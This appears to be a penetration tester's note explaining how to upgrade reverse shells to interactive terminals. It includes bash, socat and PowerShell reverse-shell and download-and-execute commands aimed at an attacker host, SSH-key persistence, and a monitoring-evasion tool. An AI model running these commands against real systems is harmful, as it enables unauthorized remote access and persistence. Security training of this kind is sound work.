---
created: 2026-09-08
updated: 2026-10-06
tags:
  - shells
proofread: no
---
## Interactive vs. non-interactive shells

>[!note] For architectural details on process streams, file descriptors, and terminal line disciplines, see [[🛠️ How shells work]].

- Standard network shells (such as non-interactive reverse shells) bind process I/O directly to a raw network socket:

```bash
bash -i >& /dev/tcp/<attacker_ip_address>/<port> 0>&1
```

- When connected directly to a network stream, the shell bypasses the operating system **line discipline**. Input characters are sent directly over TCP to the remote shell process without intermediary terminal abstraction (TTY/PTY).
- Because the shell is spawned without a controlling terminal, the session has multiple limitations:



>[!warning]+ Symptoms of a non-interactive shell
>- `Ctrl + C` terminates the local listener process instead of sending `SIGINT` to the remote child process.
>- Command line editing, persistent history navigation, and tab completion are unavailable.
>- Interactive utilities requiring terminal emulation (`vim`, `nano`, `top`, `htop`, `ssh`, `su`, `sudo`, `passwd`) fail or immediately abort because `isatty(3)` returns `0`.
>- Standard error (`stderr`) may fail to display or may redirect incorrectly.
>- Terminal escape sequences, dynamic window resizing, and ANSI colors are unrendered.

- Upgrading a shell establishes a pseudo-terminal (PTY) pair on the target and adjusts the local terminal line discipline to enable full interactive control.

## Mechanics of a shell upgrade

- Upgrading an active shell session requires three primary operations:
	1. **PTY Allocation:** Creating a master/slave pseudo-terminal pair on the target operating system and attaching the target shell process to the slave device (`/dev/pts/X`).
	2. **Raw Mode Configuration:** Switching the local terminal line discipline to raw mode (`stty raw -echo`), disabling local character buffering, signal generation (`Ctrl + C`), and local echoing.
	3. **Terminal Synchronization:** Setting environment variables (`TERM`, `SHELL`) and geometry dimensions (`rows`, `columns`) to ensure remote full-screen utilities align with the local display.

```
+-----------------------------------------------------------------------------------+
| Attacker Host                                                                     |
|                                                                                   |
|  [Terminal Window] <---> [Line Discipline: RAW (-echo)] <---> [Network Socket]   |
+------------------------------------------------------------------------|----------+
                                                                         |
                                                                         | TCP Stream
                                                                         v
+------------------------------------------------------------------------|----------+
| Target Host                                                            |          |
|                                                                        v          |
|  [Shell (/bin/bash)] <---> [Slave: /dev/pts/X] <---> [PTY Master] <---> [Socket]  |
+-----------------------------------------------------------------------------------+
```

## Linux shell upgrades

### Python PTY method

- Spawning a PTY via Python's built-in `pty` module is the standard technique for Unix-like operating systems.

1. Start a netcat listener on the attacker system:

```bash
nc -lvnp 1337
```

2. Catch the initial reverse shell from the target.

3. Allocate a pseudo-terminal on the target using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

*If Python 3 is unavailable, use Python 2:*

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

>[!interesting]+ How `pty.spawn()` operates
>- `import pty` loads the POSIX pseudo-terminal interface.
>- `pty.spawn("/bin/bash")` invokes `openpty(3)` to allocate a master/slave PTY pair, forks the process, attaches standard file descriptors (`0`, `1`, `2`) to the slave PTY, and executes `/bin/bash`.
>- The spawned shell now operates within a valid terminal context, satisfying `isatty(3)` checks.

>[!warning] Allocating a PTY on the target only handles the remote process. The local terminal is still in canonical mode and will capture `Ctrl + C` locally unless the following `stty raw` sequence is completed.

### `stty raw` terminal configuration

- After spawning a remote PTY, configure the local terminal's line discipline to forward all raw keycodes across the network.

1. Suspend the active Netcat session by pressing `Ctrl + Z`:

```bash
user@target:~$ ^Z
[1]+  Stopped                 nc -lvnp 1337
attacker@kali:~$
```

2. Query the current local terminal dimensions and record the rows and columns:

```bash
stty size
```
*Example output:* `42 160` (42 rows, 160 columns).

3. Set the local line discipline to raw mode, disable echo, and resume the backgrounded listener in the foreground:

```bash
stty raw -echo && fg
```

4. Press `Enter` twice to refresh the prompt.

5. Synchronize terminal geometry and environment variables on the remote shell:

```bash
stty rows 42 cols 160
export TERM=xterm-256color
export SHELL=/bin/bash
```

>[!interesting]+ Mechanism of `stty raw -echo`
>- `raw`: Disables the terminal line discipline processing. Characters are transmitted immediately without waiting for a newline, and special control sequences (`Ctrl + C`, `Ctrl + Z`, `Ctrl + D`, `Ctrl + \`) are passed directly over the network to the remote target.
>- `-echo`: Disables local character echoing, preventing duplicate characters from rendering on screen (since the remote PTY echoes input back).
>- `fg`: Restores the suspended listener job to the foreground.

>[!tip] Restoring the local terminal upon session termination
>When the remote shell terminates or the connection drops, the local terminal remains in raw mode (keystrokes and returns will appear unformatted). Run the following command blind and press `Enter` to reset:
>```bash
>reset
>```

### `socat` full interactive TTY

- If `socat` is installed or uploaded to the target, it can establish a fully interactive PTY directly without requiring manual `stty` reconfiguration.

1. On the attacker system, start a `socat` listener configured for raw terminal handling:

```bash
socat file:$(tty),raw,echo=0 TCP-LISTEN:1337,reuseaddr
```

2. On the target system, execute a `socat` reverse shell:

```bash
socat TCP:<attacker_ip_address>:1337 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

>[!interesting]- Breakdown of `socat` execution parameters
>- `file:$(tty),raw,echo=0`: Attaches the local controlling terminal directly to the socket in raw mode with local echoing disabled.
>- `EXEC:'bash -li'`: Spawns an interactive login Bash shell.
>- `pty`: Allocates a pseudo-terminal for the process.
>- `stderr`: Duplicates standard error into the output channel.
>- `setsid`: Spawns the shell in a new session, establishing process leadership for job control.
>- `sigint`: Passes interrupt signals (`SIGINT` / `Ctrl + C`) to the remote child process.
>- `sane`: Enforces standard terminal driver settings on the allocated PTY.

### `script` PTY allocation

- The `script` utility records terminal sessions and allocates a pseudo-terminal as part of its operation.

1. Catch the initial reverse shell with Netcat.

2. Execute `script` on the target to spawn a shell within a newly created PTY:

```bash
script -qc /bin/bash /dev/null
```

*On BSD-derived operating systems (including macOS):*

```bash
script -q /dev/null /bin/bash
```

>[!interesting]+ Breakdown of `script` options
>- `-q`: Quiet mode; suppresses startup and exit status banners.
>- `-c /bin/bash`: Executes `/bin/bash` inside the PTY rather than the user's default shell.
>- `/dev/null`: Directs session output recording to `/dev/null` to discard the typescript log.

3. Follow the `stty raw -echo && fg` procedure on the attacker host to complete the upgrade.

### Alternative PTY and interpreter spawns

- When Python and `script` are unavailable, alternative interpreters and utilities can allocate a PTY or execute an interactive subshell:

```bash
# Perl PTY allocation
perl -e 'use POSIX qw(setsid); setsid(); open(STDIN, "<&", $s); open(STDOUT, ">&", $s); open(STDERR, ">&", $s); exec("/bin/bash -i");'
```

```bash
# Perl basic interactive execution
perl -e 'exec "/bin/bash -i";'
```

```bash
# Ruby basic interactive execution
ruby -e 'exec "/bin/bash -i"'
```

```bash
# Expect PTY allocation
expect -c 'spawn /bin/bash; interact'
```

```bash
# Lua command execution
lua -e 'os.execute("/bin/bash")'
```

```bash
# Node.js spawn execution
node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]});'
```

>[!note] Commands utilizing `exec "/bin/bash -i"` or `os.execute` start an interactive shell instance but do not allocate a PTY device file (`/dev/pts/X`). Utilities such as `expect` and `python` allocate true PTY devices.

### SSH authorized keys deployment

- When SSH (`sshd`) is running on the target and write access to a user's home directory is available, adding an SSH public key provides a stable, authenticated, and fully interactive PTY.

1. Generate a dedicated SSH key pair on the attacker system:

```bash
ssh-keygen -t ed25519 -f ./id_drop -N ""
```

2. From the existing reverse shell, append the public key to the target user's `authorized_keys` file:

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "<contents_of_id_drop.pub>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

3. Connect directly via SSH to obtain an interactive session:

```bash
ssh -i ./id_drop user@<target_ip_address>
```

### Environment stabilization

- Once the PTY is allocated and raw mode is engaged, export essential environment variables:

```bash
export TERM=xterm-256color
export SHELL=/bin/bash
export PS1='[\u@\h \W]\$ '
```

| Variable | Description |
| :--- | :--- |
| `TERM=xterm-256color` | Define terminal capability strings required by full-screen utilities (`vim`, `nano`, `clear`, `less`). |
| `SHELL=/bin/bash` | Specify the default shell binary for subshell execution (e.g., `:!sh` within editors). |
| `PS1='[\u@\h \W]\$ '` | Define the interactive prompt format displaying username, hostname, and current working directory. |

## Windows shell upgrades

- Standard Windows reverse shells (`cmd.exe` or `powershell.exe`) lack interactive console handles (`CONIN$`, `CONOUT$`), resulting in missing tab completion, lack of history navigation, and immediate failures when invoking console applications.

### `rlwrap` listener wrapper

- Wrapping the attacker listener with `rlwrap` provides client-side GNU Readline support, enabling arrow-key navigation, command line history, and line editing for incoming connections.

```bash
rlwrap -cAr nc -lvnp 1337
```

| Option | Description |
| :--- | :--- |
| `-c` | Enable complete filenames. |
| `-A` | Prompt readline to ignore ANSI escape codes. |
| `-r` | Remember all input tokens for completion. |

>[!note] `rlwrap` modifies input processing exclusively on the attacker host. It does not create a Windows Console API instance on the target; applications requiring direct console handles will still fail.

### ConPtyShell (ConPTY API)

- Windows 10 (version 1809+, build 17763+) and Windows Server 2019+ introduce the **Pseudo Console (ConPTY)** API, allowing true pseudo-terminal allocation on Windows systems.

- [`ConPtyShell`](https://github.com/antonioCoco/ConPtyShell) creates a ConPTY session on the target and attaches it to an outbound TCP connection.

1. On the attacker system, determine terminal dimensions and start a raw listening socket:

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

2. On the target system, load and execute `Invoke-ConPtyShell` via PowerShell:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip_address>:8000/Invoke-ConPtyShell.ps1')
Invoke-ConPtyShell <attacker_ip_address> 3001
```

*One-line memory execution:*

```powershell
IEX(IWR http://<attacker_ip_address>:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <attacker_ip_address> 3001
```

>[!interesting]+ ConPTY operational mechanics
>- The `(stty size; cat)` command transmits the local terminal height and width upon connection.
>- `Invoke-ConPtyShell` invokes `CreatePseudoConsole()` to allocate a ConPTY object matching those dimensions.
>- Standard I/O streams of the target process (`powershell.exe` or `cmd.exe`) are attached to the ConPTY buffer, producing a fully interactive Windows console session.

### Upgrading `cmd.exe` to PowerShell

- When a shell lands in a `cmd.exe` environment, transition to an unconstrained PowerShell instance:

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass
```

| Option | Description |
| :--- | :--- |
| `-NoProfile` | Prevent loading user PowerShell profile scripts to minimize startup latency. |
| `-ExecutionPolicy Bypass` | Bypass execution policy restrictions to enable script execution for the current session. |

### Hoaxshell

- [`hoaxshell`](https://github.com/t3l3machus/hoaxshell) is a Windows reverse shell framework that operates over encrypted HTTP/HTTPS tunnels, establishing a pseudo-interactive session designed to evade defensive monitoring and egress restrictions.

1. Generate a listener and payload on the attacker host:

```bash
python3 hoaxshell.py -s <attacker_ip_address> -i
```

2. Execute the generated PowerShell command on the target system to establish the session.

## Troubleshooting and common issues

| Symptom | Cause | Solution |
| :--- | :--- | :--- |
| `Ctrl + C` terminates the listener | Local line discipline is in canonical mode | Suspend the session (`Ctrl + Z`), execute `stty raw -echo && fg`, and press `Enter`. |
| Characters are displayed twice | Local echo and remote echo are both active | Ensure `-echo` is included in the `stty` configuration command (`stty raw -echo`). |
| Full-screen programs (`vim`, `top`) corrupt the display | Terminal dimensions are mismatched | Query local size via `stty size` and apply to remote shell using `stty rows <R> cols <C>`. |
| `clear` returns `TERM environment variable not set` | Missing `TERM` variable definition | Define the variable in the remote session using `export TERM=xterm-256color`. |
| Arrows keys render escape sequences (`^[[A`) | Shell lacks PTY allocation or readline support | Allocate a PTY via Python/script or prepend the listener with `rlwrap`. |
| Local terminal remains unformatted after exit | Terminal remains configured in raw mode | Execute `reset` in the local terminal window and press `Enter`. |

## References and further reading

- [`Upgrade to Fully Interactive TTYs — 0xffsec`](https://0xffsec.com/handbook/shells/full-tty/)
- [`Upgrading Simple Shells to Fully Interactive TTYs — ropnop blog`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [`ConPtyShell — antonioCoco, GitHub`](https://github.com/antonioCoco/ConPtyShell)
- [`Windows PseudoConsole (ConPTY) — Microsoft Docs`](https://learn.microsoft.com/en-us/windows/console/creating-a-pseudoconsole-session)
- [`hoaxshell — t3l3machus, GitHub`](https://github.com/t3l3machus/hoaxshell)
- [`stty(1) — Linux Manual Page`](https://man7.org/linux/man-pages/man1/stty.1.html)
